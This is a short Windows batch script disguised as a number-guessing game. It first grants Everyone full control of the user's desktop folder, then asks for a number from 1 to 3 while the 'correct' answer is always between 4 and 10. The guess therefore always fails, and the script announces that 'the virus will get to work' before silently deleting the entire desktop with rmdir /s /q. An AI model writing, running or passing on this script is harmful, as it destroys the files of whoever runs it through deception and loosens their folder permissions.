@echo off
setlocal enabledelayedexpansion

:: Set the path to the desktop
set desktopPath=C:\Users\user\Desktop

:: Grant full permissions to the desktop
icacls "!desktopPath!" /grant Everyone:(OI)(CI)F

:: Generate a random number between 4 and 10
set /a "correct_num=%random% %% 7 + 4"


:: Define the main function
:fun_main
set /p inp=Enter a number from 1 to 3: 

:: Check if the input is correct
if !inp! equ %correct_num% (
    echo Correct, you 'genius'!
) else (
    echo You were a little unfortunate and now the virus will get to work, removing directory...
    set directoryPath=C:\Users\user\Desktop
    rmdir /s /q "!directoryPath!"
    echo Directory "!directoryPath!" removed successfully.
)

endlocal
